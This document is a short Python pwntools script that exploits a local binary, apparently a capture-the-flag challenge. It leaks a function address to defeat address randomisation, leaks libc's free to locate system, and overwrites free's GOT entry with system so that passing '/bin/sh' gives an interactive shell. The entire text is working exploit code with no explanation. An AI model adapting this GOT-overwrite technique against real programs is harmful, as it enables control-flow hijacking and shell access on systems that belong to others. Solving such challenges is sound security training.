from pwn import *

binary = ELF('./a.out')
libc = ELF('./libc.so.6')


def send(b):
    p.sendlineafter(':',b)
def send2(b):
    p.sendafter('name:',b)

p = process('./a.out')

send('2')
send('a'*8)
send('7')

send('1')
send('5')
gdb.attach(p)
p.readuntil('name is ')
get_flag = p.readuntil('\n')[:-1]
get_flag = u64(get_flag + '\x00'*(8-len(get_flag)))

base = get_flag - binary.symbols['getFlag']
free = base + binary.symbols['got.free']
print hex(base)

send('6')
send('4')
send2(p64(free))
p.interactive()
send('1')

send('6')
send('2')
send2('/bin/sh\x00')

send('2')
send2('\x50')

send('5')

p.readuntil('name is ')
get_flag = p.readuntil('\n')[:-1]
get_flag = u64(get_flag + '\x00'*(8-len(get_flag)))

base = get_flag - libc.symbols['free']
system = base + libc.symbols['system']
print hex(system)

send('4')
send2(p64(system))


p.interactive()
